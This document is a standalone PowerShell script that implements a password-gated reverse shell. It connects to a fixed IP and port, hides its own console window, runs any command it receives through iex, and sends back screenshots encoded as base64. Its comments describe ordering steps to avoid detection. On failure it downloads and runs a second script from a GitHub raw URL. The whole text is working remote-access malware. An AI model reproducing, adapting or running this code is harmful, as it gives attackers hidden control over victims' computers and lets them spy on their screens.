$ip = '192.168.1.15'
$port = 4444
$pass = 'biskviti'

try {
    # 1. RAW CONNECTION (No suspicious imports yet)
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true

    $w.WriteLine("AUTH:")
    $input = $r.ReadLine()

    if ($input -eq $pass) {
        # 2. HIDE WINDOW ONLY AFTER AUTH
        try {
            $h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
            $type = Add-Type -MemberDefinition $h -Name "W32" -Namespace "W" -PassThru
            $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
        } catch {}

        $w.WriteLine("--- ACCESS GRANTED ---")

        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $cmd = $r.ReadLine(); if ($null -eq $cmd) { break }
            $cmd = $cmd.Trim()

            if ($cmd -eq "screenshot") {
                # 3. LOAD DRAWING ONLY WHEN NEEDED
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            } else {
                iex $cmd 2>&1 | Out-String | %{ $w.WriteLine($_) }
            }
        }
    } else {
        $w.WriteLine("FAIL"); exit
    }
} catch {
    Start-Sleep -s 60; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')
}
